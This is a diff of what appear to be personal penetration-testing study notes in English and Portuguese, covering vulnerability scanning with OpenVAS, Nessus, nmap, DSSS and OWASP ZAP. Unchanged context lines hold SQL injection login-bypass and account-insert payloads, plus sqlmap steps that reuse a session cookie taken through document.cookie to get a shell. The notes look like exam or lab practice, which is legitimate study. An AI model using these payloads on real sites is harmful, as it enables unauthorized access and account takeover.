@@ -21,6 +21,14 @@ If even this the above command is not working then use this command-  namp -f 10
 5- FTP enum using nmap-  nmap -p 21 -A 10.10.10.10 
 6- NetBios enum using enum4linux- enum4linux -u martin -p apple -n 10.10.10.10 (all info)
 				  enum4linux -u martin -p apple -P 10.10.10.10 (policy info)
+
+vulnerabilities
+OPenVAS (Applications -> Pentisting -> Vylnerability Analysis -> OpenVAS Greenbone -> manager service) admin/password
+Scans -> Tasks -> Task Wizerd ... quando acaber vai em Results
+e pode ser tbm nmap -sV --script vuln 192.168.142.22
+
+ou Nessus em https://localhost:8834 admin password ... Policies new Policy advnaced Scan salva e POrt Scanning open tcp ports enum Advanced mas ... tem que ter uma senha do site (varredura credenciada)
+
 ```
 #  Quick Overview (Stegnography) --> Snow , Openstego
 ```
@@ -87,7 +95,7 @@ blah' or 1=1 --
 (se a requisicao for um post, tem que pegar a req no "Buster"(esqueci o nome) e gravar num arquivo e fazer
 sqlmap -r req.txt ....
 hook www.movies.com/viewprofile.apsx?id=1
-f12 no browser Storage e pegar o cookie
+f12 no browser(melhor tentar INspect em qq lugar da tela).. Storage e pegar o cookie
 na aba Console digitar document.cookie
 2- Insert new details if sql injection found in login page in username tab enter- blah';insert into login values('john','apple123');--
 3- Exploit a Blind SQL Injection- In the website profile, do inspect element and in the console tab write -  document.cookie
@@ -99,6 +107,18 @@ sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that yo
 6.1 In the shell type-   TASKLIST  (to view the tasks)
 6.2 Use systeminfo for windows to get all os version
 6.3 Use uname -a for linux to get os version
+
+Outra maneira de encontrar vulnerabilidade
+
+1- cd DSSS/ pra achar o diretorio que tem o dsss.py e executar python3 dsss.py -u "http://moveis.com/viewsprofile.aspx?id=1" --cookie="mscope=1nkndfkndk; ui-tabs-1=0"
+da[iisso fala se eh vulneravel, da'i copie a URL dada e bota no navegador
+
+Outra
+
+1- Usar o OWASP ZAP no WIndows -> Automated Scan
+O bicho faz tudo, soh botar a url pura mesmo
+
+
 ```
 # Android
 ```
